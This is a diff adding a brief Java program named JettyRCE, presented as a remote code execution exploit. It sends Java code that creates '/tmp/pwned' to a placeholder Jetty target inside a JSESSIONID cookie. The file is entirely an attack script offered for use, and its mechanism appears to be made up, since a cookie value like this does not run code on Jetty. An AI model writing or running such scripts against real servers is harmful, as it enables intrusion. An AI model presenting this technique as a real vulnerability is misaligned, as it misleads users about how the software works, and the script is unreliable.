@@ -1,0 +1,16 @@
+import java.io.IOException;
+import java.net.URL;
+import java.net.URLConnection;
+
+public class JettyRCE {
+    public static void main(String[] args) throws IOException {
+        String url = "http://target:8080/"; // replace with your target URL
+        String payload = "java.lang.Runtime.getRuntime().exec(\"touch /tmp/pwned\");";
+
+        URLConnection conn = new URL(url + "org.eclipse.jetty.server.session.SessionIdManager").openConnection();
+        conn.setRequestProperty("Cookie", "JSESSIONID=" + payload);
+        conn.connect();
+
+        System.out.println("Exploit sent!");
+    }
+}
